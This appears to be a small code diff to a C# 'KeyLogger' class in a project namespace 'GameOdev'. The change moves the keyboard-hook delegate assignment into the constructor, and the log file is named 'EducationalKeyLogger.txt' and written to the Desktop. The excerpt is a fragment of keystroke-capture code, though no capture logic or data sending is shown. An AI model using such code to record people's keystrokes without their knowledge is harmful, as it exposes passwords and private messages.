@@ -48,7 +48,7 @@ namespace GameOdev
 
         #region Private Fields
 
-        private LowLevelKeyboardProc _proc = HookCallback;
+        private LowLevelKeyboardProc _proc;
         private IntPtr _hookID = IntPtr.Zero;
         private bool _isLogging = false;
         private string _logFilePath;
@@ -67,6 +67,7 @@ namespace GameOdev
 
         public KeyLogger()
         {
+            _proc = HookCallback;
             _logFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "EducationalKeyLogger.txt");
         }
 
